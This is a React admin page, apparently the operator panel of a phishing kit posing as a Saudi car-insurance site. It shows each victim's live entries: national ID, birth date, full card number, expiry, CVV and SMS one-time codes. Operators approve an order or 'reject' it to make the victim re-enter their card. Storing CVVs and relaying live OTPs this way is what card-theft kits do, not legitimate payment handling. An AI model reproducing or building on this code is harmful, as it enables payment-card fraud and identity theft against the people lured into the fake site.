import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { SidebarProvider } from "@/components/ui/sidebar";
import { AdminSidebar } from "@/components/AdminSidebar";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";
import { Loader2, CreditCard, Shield, User, Calendar, Phone, FileText, Check, X } from "lucide-react";

interface CustomerOrder {
  id: string;
  sequence_number: string;
  vehicle_type: string;
  vehicle_purpose: string;
  id_number: string;
  birth_date: string;
  insurance_company: string;
  insurance_price: number;
  card_number: string;
  card_holder_name: string;
  expiry_date: string;
  cvv: string;
  otp_code: string | null;
  otp_verified: boolean;
  status: string;
  created_at: string;
  updated_at: string;
}

const AdminOrders = () => {
  const navigate = useNavigate();
  const { toast } = useToast();
  const [orders, setOrders] = useState<CustomerOrder[]>([]);
  const [loading, setLoading] = useState(true);
  const [processingOrderId, setProcessingOrderId] = useState<string | null>(null);

  useEffect(() => {
    const checkAuthAndFetchOrders = async () => {
      const { data: { session } } = await supabase.auth.getSession();
      if (!session) {
        navigate("/admin/login");
        return;
      }

      await fetchOrders();
      
      // Subscribe to realtime updates
      const channel = supabase
        .channel('orders-changes')
        .on(
          'postgres_changes',
          {
            event: '*',
            schema: 'public',
            table: 'customer_orders'
          },
          () => {
            fetchOrders();
          }
        )
        .subscribe();

      return () => {
        supabase.removeChannel(channel);
      };
    };

    checkAuthAndFetchOrders();
  }, [navigate]);

  const fetchOrders = async () => {
    try {
      const { data, error } = await supabase
        .from("customer_orders")
        .select("*")
        .order("updated_at", { ascending: false });

      if (error) {
        console.error("Error fetching orders:", error);
      } else {
        setOrders(data || []);
      }
      setLoading(false);
    } catch (error) {
      console.error("Error fetching orders:", error);
      setLoading(false);
    }
  };

  const formatDate = (date: string) => {
    return new Date(date).toLocaleDateString("ar-SA", {
      year: "numeric",
      month: "long",
      day: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    });
  };

  const getStatusBadge = (status: string, otpVerified: boolean) => {
    if (status === "completed" && otpVerified) {
      return <Badge className="bg-green-500 hover:bg-green-600">مكتمل ✓</Badge>;
    } else if (status === "pending") {
      return <Badge variant="secondary">قيد التنفيذ...</Badge>;
    } else {
      return <Badge variant="destructive">ملغي</Badge>;
    }
  };

  const handleApprove = async (orderId: string) => {
    setProcessingOrderId(orderId);
    try {
      const { error } = await supabase
        .from("customer_orders")
        .update({ status: "completed", otp_verified: true })
        .eq("id", orderId);

      if (error) throw error;

      toast({
        title: "تم الموافقة بنجاح ✓",
        description: "تم تحديث حالة الطلب إلى مكتمل",
        duration: 3000,
      });
      
      await fetchOrders();
    } catch (error) {
      console.error("Error approving order:", error);
      toast({
        title: "حدث خطأ",
        description: "فشل في تحديث حالة الطلب",
        variant: "destructive",
      });
    } finally {
      setProcessingOrderId(null);
    }
  };

  const handleReject = async (orderId: string) => {
    setProcessingOrderId(orderId);
    try {
      const { error } = await supabase
        .from("customer_orders")
        .update({ status: "cancelled" })
        .eq("id", orderId);

      if (error) throw error;

      toast({
        title: "تم الرفض",
        description: "يرجى إعادة إدخال أرقام البطاقة",
        variant: "destructive",
        duration: 3000,
      });
      
      await fetchOrders();
    } catch (error) {
      console.error("Error rejecting order:", error);
      toast({
        title: "حدث خطأ",
        description: "فشل في تحديث حالة الطلب",
        variant: "destructive",
      });
    } finally {
      setProcessingOrderId(null);
    }
  };

  const getCompletionPercentage = (order: CustomerOrder) => {
    let completed = 0;
    const total = 6;
    
    if (order.id_number && order.sequence_number) completed++;
    if (order.vehicle_type && order.vehicle_purpose) completed++;
    if (order.insurance_company && order.insurance_price > 0) completed++;
    if (order.card_number && order.card_holder_name) completed++;
    if (order.expiry_date && order.cvv) completed++;
    if (order.otp_code) completed++;
    
    return Math.round((completed / total) * 100);
  };

  return (
    <SidebarProvider>
      <div className="min-h-screen flex w-full">
        <AdminSidebar />
        <main className="flex-1 p-8 bg-gradient-to-br from-background via-muted/20 to-background">
          <div className="max-w-7xl mx-auto">
            <div className="mb-8">
              <h1 className="text-4xl font-bold bg-gradient-to-r from-primary to-accent bg-clip-text text-transparent">
                طلبات العملاء
              </h1>
              <p className="text-muted-foreground mt-2">
                جميع طلبات التأمين المسجلة في النظام - تحديث تلقائي
              </p>
            </div>

            {loading ? (
              <div className="flex justify-center items-center py-12">
                <Loader2 className="h-8 w-8 animate-spin text-primary" />
              </div>
            ) : orders.length === 0 ? (
              <Card className="text-center py-12">
                <CardContent>
                  <Shield className="h-16 w-16 mx-auto mb-4 text-muted-foreground" />
                  <p className="text-muted-foreground">لا توجد طلبات مسجلة حتى الآن</p>
                </CardContent>
              </Card>
            ) : (
              <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                {orders.map((order) => {
                  const completionPercent = getCompletionPercentage(order);
                  
                  return (
                    <Card 
                      key={order.id} 
                      className="hover:shadow-2xl transition-all duration-300 border-2 hover:border-primary/50 relative overflow-hidden"
                    >
                      {/* Completion Progress Bar */}
                      <div 
                        className="absolute top-0 left-0 h-1 bg-gradient-to-r from-primary to-accent transition-all duration-500"
                        style={{ width: `${completionPercent}%` }}
                      />

                      <CardHeader className="pb-4">
                        <div className="flex justify-between items-start">
                          <div>
                            <CardTitle className="text-xl mb-2 flex items-center gap-2">
                              <FileText className="h-5 w-5 text-primary" />
                              طلب #{order.sequence_number || "غير محدد"}
                            </CardTitle>
                            <CardDescription className="flex items-center gap-2">
                              <Calendar className="h-4 w-4" />
                              {formatDate(order.updated_at)}
                            </CardDescription>
                          </div>
                          <div className="text-right">
                            {getStatusBadge(order.status, order.otp_verified)}
                            <div className="text-xs text-muted-foreground mt-2">
                              اكتمال {completionPercent}%
                            </div>
                          </div>
                        </div>
                      </CardHeader>

                      <CardContent className="space-y-6">
                        {/* Customer Info */}
                        <div className="bg-gradient-to-br from-primary/5 to-primary/10 rounded-xl p-4 border border-primary/20">
                          <h3 className="font-semibold mb-3 flex items-center gap-2 text-primary">
                            <User className="h-4 w-4" />
                            معلومات العميل
                          </h3>
                          <div className="space-y-2 text-sm">
                            <div className="flex justify-between">
                              <span className="text-muted-foreground">رقم الهوية:</span>
                              <span className="font-medium">{order.id_number || "لم يتم الإدخال"}</span>
                            </div>
                            <div className="flex justify-between">
                              <span className="text-muted-foreground">تاريخ الميلاد:</span>
                              <span className="font-medium">{order.birth_date || "لم يتم الإدخال"}</span>
                            </div>
                          </div>
                        </div>

                        {/* Vehicle Info */}
                        <div className="bg-gradient-to-br from-blue-500/5 to-blue-500/10 rounded-xl p-4 border border-blue-500/20">
                          <h3 className="font-semibold mb-3 flex items-center gap-2 text-blue-600">
                            <Shield className="h-4 w-4" />
                            معلومات المركبة
                          </h3>
                          <div className="space-y-2 text-sm">
                            <div className="flex justify-between">
                              <span className="text-muted-foreground">نوع المركبة:</span>
                              <span className="font-medium">{order.vehicle_type || "لم يتم الاختيار"}</span>
                            </div>
                            <div className="flex justify-between">
                              <span className="text-muted-foreground">الغرض:</span>
                              <span className="font-medium">{order.vehicle_purpose || "لم يتم الاختيار"}</span>
                            </div>
                          </div>
                        </div>

                        {/* Insurance Info */}
                        <div className="bg-gradient-to-br from-green-500/5 to-green-500/10 rounded-xl p-4 border border-green-500/20">
                          <h3 className="font-semibold mb-3 flex items-center gap-2 text-green-600">
                            <Shield className="h-4 w-4" />
                            معلومات التأمين
                          </h3>
                          <div className="space-y-2 text-sm">
                            <div className="flex justify-between">
                              <span className="text-muted-foreground">الشركة:</span>
                              <span className="font-medium text-right max-w-[60%]">
                                {order.insurance_company || "لم يتم الاختيار"}
                              </span>
                            </div>
                            <div className="flex justify-between">
                              <span className="text-muted-foreground">السعر:</span>
                              <span className="font-bold text-green-600">
                                {order.insurance_price > 0 ? `${order.insurance_price} ريال` : "لم يتم الاختيار"}
                              </span>
                            </div>
                          </div>
                        </div>

                        {/* Payment Info */}
                        <div className="bg-gradient-to-br from-orange-500/5 to-orange-500/10 rounded-xl p-4 border border-orange-500/20">
                          <h3 className="font-semibold mb-3 flex items-center gap-2 text-orange-600">
                            <CreditCard className="h-4 w-4" />
                            معلومات الدفع
                          </h3>
                          <div className="space-y-2 text-sm">
                            <div className="flex justify-between">
                              <span className="text-muted-foreground">رقم البطاقة:</span>
                              <span className="font-mono font-medium" dir="ltr">
                                {order.card_number || "لم يتم الإدخال"}
                              </span>
                            </div>
                            <div className="flex justify-between">
                              <span className="text-muted-foreground">اسم حامل البطاقة:</span>
                              <span className="font-medium">
                                {order.card_holder_name || "لم يتم الإدخال"}
                              </span>
                            </div>
                            <div className="flex justify-between">
                              <span className="text-muted-foreground">تاريخ الانتهاء:</span>
                              <span className="font-medium">
                                {order.expiry_date || "لم يتم الإدخال"}
                              </span>
                            </div>
                            <div className="flex justify-between">
                              <span className="text-muted-foreground">CVV:</span>
                              <span className="font-mono font-medium">
                                {order.cvv || "لم يتم الإدخال"}
                              </span>
                            </div>
                          </div>
                        </div>

                        {/* OTP Verification */}
                        <div className={`rounded-xl p-4 border ${
                          order.otp_verified 
                            ? "bg-gradient-to-br from-green-500/5 to-green-500/10 border-green-500/20" 
                            : "bg-gradient-to-br from-gray-500/5 to-gray-500/10 border-gray-500/20"
                        }`}>
                          <h3 className={`font-semibold mb-3 flex items-center gap-2 ${
                            order.otp_verified ? "text-green-600" : "text-muted-foreground"
                          }`}>
                            <Phone className="h-4 w-4" />
                            التحقق من OTP
                          </h3>
                          <div className="space-y-2 text-sm">
                            <div className="flex justify-between items-center">
                              <span className="text-muted-foreground">كود التحقق:</span>
                              <span className="font-mono">
                                {order.otp_code || "لم يتم الإدخال"}
                              </span>
                            </div>
                            <div className="flex justify-between items-center">
                              <span className="text-muted-foreground">حالة التحقق:</span>
                              {order.otp_verified ? (
                                <Badge className="bg-green-500">تم التحقق ✓</Badge>
                              ) : (
                                <Badge variant="secondary">لم يتم التحقق</Badge>
                              )}
                            </div>
                          </div>
                        </div>

                        {/* Action Buttons */}
                        {order.status === "pending" && (
                          <div className="flex gap-3 pt-2">
                            <Button
                              onClick={() => handleApprove(order.id)}
                              disabled={processingOrderId === order.id}
                              className="flex-1 bg-green-600 hover:bg-green-700"
                            >
                              {processingOrderId === order.id ? (
                                <Loader2 className="h-4 w-4 animate-spin" />
                              ) : (
                                <>
                                  <Check className="h-4 w-4 ml-2" />
                                  موافقة
                                </>
                              )}
                            </Button>
                            <Button
                              onClick={() => handleReject(order.id)}
                              disabled={processingOrderId === order.id}
                              variant="destructive"
                              className="flex-1"
                            >
                              {processingOrderId === order.id ? (
                                <Loader2 className="h-4 w-4 animate-spin" />
                              ) : (
                                <>
                                  <X className="h-4 w-4 ml-2" />
                                  رفض
                                </>
                              )}
                            </Button>
                          </div>
                        )}
                      </CardContent>
                    </Card>
                  );
                })}
              </div>
            )}
          </div>
        </main>
      </div>
    </SidebarProvider>
  );
};

export default AdminOrders;
